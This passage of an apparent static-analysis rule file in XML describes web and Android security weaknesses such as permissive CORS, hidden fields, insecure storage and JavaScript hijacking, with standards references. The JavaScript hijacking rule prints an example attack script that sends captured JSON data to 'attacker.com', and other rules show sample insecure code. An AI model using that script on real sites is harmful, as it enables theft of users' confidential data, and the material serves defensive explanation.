																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Erika Chin and David Wagner <em>Bifocals: Analyzing WebView Vulnerabilities in Android Applications</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_html5_overly_permissive_cors_policy</key>
		<internalKey>Encapsulation/HTML5/Overly Permissive CORS Policy
		</internalKey>
		<name>HTML5: Overly Permissive CORS Policy</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program defines an overly permissive Cross-Origin Resource Sharing (CORS) policy.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Prior to HTML5, Web browsers enforced the Same Origin Policy which ensures that in order for JavaScript to access the contents of a Web page, both the JavaScript and the Web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. HTML5 makes it possible for JavaScript to access data across domains if a new HTTP header called <code>Access-Control-Allow-Origin</code> is defined. With this header, a Web server defines which other domains are allowed to access its domain using cross-origin requests. However, caution should be taken when defining the header because an overly permissive CORS policy will allow a malicious application to communicate with the victim application in an inappropriate way, leading to spoofing, data theft, relay and other attacks.<br><br><b>Example 1:</b> Below is an example of using a wildcard to programmatically specify which domains the application is allowed to communicate with.<br><br><pre><br>  response.addHeader("Access-Control-Allow-Origin", "*");<br></pre><br><br>Using the <code>*</code> as the value of the <code>Access-Control-Allow-Origin</code> header indicates that the application's data is accessible to JavaScript running on any domain.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Philippe De Ryck, Lieven Desmet, Pieter Philippaerts, and Frank Piessens <em>A Security Analysis of Next Generation Web Standards</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[4] W3C <em>Cross-Origin Resource Sharing</em> <br></p>
																									   <p>[5]  <em>Enable Cross-Origin Resource Sharing</em> <br></p>
																									   <p>[6] Michael Schmidt <em>HTML5 Web Security</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_hidden_field</key>
		<internalKey>Encapsulation/Hidden Field</internalKey>
		<name>Hidden Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program creates a hidden form field.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programmers often trust the contents of hidden fields, expecting that users will not be able to view them or manipulate their contents. Attackers will violate these assumptions. They will examine the values written to hidden fields and alter them or replace the contents with attack data.<br><br><br><br><b>Example:</b><br><pre><br>  Hidden hidden = new Hidden(element);<br></pre><br><br>If hidden fields carry sensitive information, this information will be cached the same way the rest of the page is cached. This can lead to sensitive information being tucked away in the browser cache without the user's knowledge.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3610 CAT I</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3610 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3610 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3610 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3610 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 472, CWE ID 642</em> <br></p>
																									   <p>[7]  <em>Input Validation and Representation</em> Fortify, An HP Company<br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 642</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_insecure_storage_android_backup_storage</key>
		<internalKey>Encapsulation/Insecure Storage/Android Backup Storage
		</internalKey>
		<name>Insecure Storage: Android Backup Storage</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program uses Android's backup service to save persistent application data to a remote cloud storage.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Android's backup service allows the application to save persistent data to a remote cloud storage in order to provide a restore point for the application data in the future.<br><br>Android applications can be configured with this backup service by defining the <code>backupAgent</code> attribute on the <code>&lt;application&gt;</code> tag.<br><br>Android however, does not guarantee the security of your data while using backup, as the cloud storage and transport vary from device to device.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[4]  <em>Android Developers API Guide: Data Backup</em> Android<br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12]  <em>JavaDoc for Android</em> Android<br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_insecure_storage_android_external_storage</key>
		<internalKey>Encapsulation/Insecure Storage/Android External Storage
		</internalKey>
		<name>Insecure Storage: Android External Storage</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  On line <Replace key="PrimaryLocation.line"/> of <Replace key="PrimaryLocation.file"/>, the method <Replace key="EnclosingFunction.name"/> writes data to Android's external storage.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Files saved to the external storage are world-readable and can be modified by the user when they enable USB mass storage to transfer files on a computer. Also, files on the external storage card will remain there even after the application that wrote the files is uninstalled. These limitations can compromise sensitive information written out to storage or allow attackers to inject malicious data into the program by modifying an external file it relies on.<br><br><b>Example 1:</b> In the code below, <code>Environment.getExternalStorageDirectory()</code> returns a reference to the Android device's external storage.<br><br><pre> private void WriteToFile(String what_to_write) {<br>        try{<br>            File root = Environment.getExternalStorageDirectory();<br>            if(root.canWrite()) {<br>                File dir = new File(root + "write_to_the_SDcard");<br>                File datafile = new File(dir, number + ".extension");<br>                FileWriter datawriter = new FileWriter(datafile);<br>                BufferedWriter out = new BufferedWriter(datawriter);<br>                out.write(what_to_write);<br>                out.close();<br>             }<br>        }<br>   }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2]  <em>Data Storage</em> <br></p>
																									   <p>[3] Paul McNamara <em>Latest 'lost' laptop holds treasure-trove of unencrypted ATT payroll data</em> Network World<br></p>
																									   <p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_insecure_storage_android_world_readable_or_writeable
		</key>
		<internalKey>Encapsulation/Insecure Storage/Android World Readable or
			Writeable
		</internalKey>
		<name>Insecure Storage: Android World Readable or Writeable</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application makes the data accessible to all applications on the Android device.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Data stored on the Android internal storage using the MODE_WORLD_READBLE or MODE_WORLD_WRITEABLE is accessible to all applications on the device.  This not only denies protection against data corruption but in case of sensitive information violates user privacy and security concerns.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[10]  <em>Designing for Security</em> Android<br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13]  <em>OWASP Top 10 Mobile Risks</em> OWASP<br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[19] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben <em>Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_insecure_transport</key>
		<internalKey>Encapsulation/Insecure Transport</internalKey>
		<name>Insecure Transport</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The call uses an unencrypted protocol instead of an encrypted protocol to communicate with the server.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  All communication over HTTP, FTP or gopher is unauthenticated and unencrypted. It is thus, subject to compromise, especially in the mobile environment where devices frequently connect to unsecured, public, wireless networks using WiFi connections.<br><br><b>Example 1:</b> The following example reads data using the HTTP protocol (versus using HTTPS).<br><br><pre><br><br>   URL url = new URL("http://www.android.com/");<br>   HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();<br>   try {<br>     InputStream in = new BufferedInputStream(urlConnection.getInputStream());<br>     readStream(in);<br>     ...<br>   }<br><br></pre><br><br>The incoming stream,<code>instream</code>, may have been compromised as it is delivered over an unencrypted and unauthenticated channel.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12]  <em>Designing for Security</em> Android<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[16]  <em>OWASP Top 10 Mobile Risks</em> OWASP<br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[23] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[24] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben <em>Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_j2ee_bad_practices_leftover_debug_code</key>
		<internalKey>Encapsulation/J2EE Bad Practices/Leftover Debug Code
		</internalKey>
		<name>J2EE Bad Practices: Leftover Debug Code</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Debug code can create unintended entry points in a deployed web application.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A common development practice is to add "back door" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the application. When this sort of debug code is accidentally left in the application, the application is open to unintended modes of interaction. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the application.<br><br>The most common example of forgotten debug code is a <code>main()</code> method appearing in a web application. Although this is an acceptable practice during product development, classes that are part of a production J2EE application should not define a <code>main()</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 489</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_javascript_hijacking_ad_hoc_ajax</key>
		<internalKey>Encapsulation/JavaScript Hijacking/Ad Hoc Ajax
		</internalKey>
		<name>JavaScript Hijacking: Ad Hoc Ajax</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An application may be vulnerable to JavaScript hijacking [1] if it:<br>      - Uses JavaScript as a data transfer format<br>      - Handles confidential data<br>Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the HP Fortify Secure Coding Rulepacks calls attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.<br>Web browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the Web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker.<br>JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional Web applications are not.<br>The most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax . JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.<br><b>Example 1:</b> The following example begins by showing a legitimate JSON interaction between the client and server components of a Web application that is used to manage sales leads. It goes on to show how an attacker can mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.<br>The client requests data from a server and evaluates the result as JSON with the following code:<br><pre><br>var object;<br>var req = new XMLHttpRequest();<br>req.open("GET", "/object.json",true);<br>req.onreadystatechange = function () {<br>  if (req.readyState == 4) {<br>    var txt = req.responseText;<br>    object = eval("(" + txt + ")");<br>    req = null;<br>  }<br>};<br>req.send(null);<br></pre><br><br>When the code runs, it generates an HTTP request that looks like this:<br><pre><br>GET /object.json HTTP/1.1<br>...<br>Host: www.example.com<br>Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR<br></pre><br>(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)<br>The server responds with an array in JSON format:<br><pre><br>HTTP/1.1 200 OK<br>Cache-control: private<br>Content-Type: text/javascript; charset=utf-8<br>...<br>[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",<br>  "purchases":60000.00, "email":"brian@fortifysoftware.com" },<br> {"fname":"Katrina", "lname":"O'Neil", "phone":"6502135600",<br>  "purchases":120000.00, "email":"katrina@fortifysoftware.com" },<br> {"fname":"Jacob", "lname":"West", "phone":"6502135600",<br>  "purchases":45000.00, "email":"jacob@fortifysoftware.com" }]<br></pre><br>In this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern Web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking.<br>If a victim can be tricked into visiting a Web page that contains the following malicious code, the victim's lead information will be sent to the attacker's Web site.<br><pre><br>&lt;script&gt;<br>// override the constructor used to create all objects so<br>// that whenever the "email" field is set, the method<br>// captureObject() will run. Since "email" is the final field,<br>// this will allow us to steal the whole object.<br>function Object() {<br> this.email setter = captureObject;<br>}<br><br>// Send the captured object back to the attacker's Web site<br>function captureObject(x) {<br>  var objString = "";<br>  for (fld in this) {<br>    objString += fld + ": " + this[fld] + ", ";<br>  }<br>  objString += "email: " + x;<br>  var req = new XMLHttpRequest();<br>  req.open("GET", "http://attacker.com?obj=" +<br>           escape(objString),true);<br>  req.send(null);<br>}<br>&lt;/script&gt;<br><br>&lt;!-- Use a script tag to bring in victim's data --&gt;<br>&lt;script src="http://www.example.com/object.json"&gt;&lt;/script&gt;<br></pre><br>The malicious code uses a script tag to include the JSON object in the current page. The Web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.<br>When the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead.<br>Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both.<br>If the user is not logged into the vulnerable site, the attacker can compensate by asking the user to log in and then displaying the legitimate login page for the application. This is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack.<br>More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] B. Chess, Y. O'Neil, and J. West <em>JavaScript Hijacking</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_javascript_hijacking_vulnerable_framework</key>
		<internalKey>Encapsulation/JavaScript Hijacking/Vulnerable Framework
		</internalKey>
		<name>JavaScript Hijacking: Vulnerable Framework</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Applications that leverage versions of the DWR Ajax framework 1.1.4 and earlier are vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
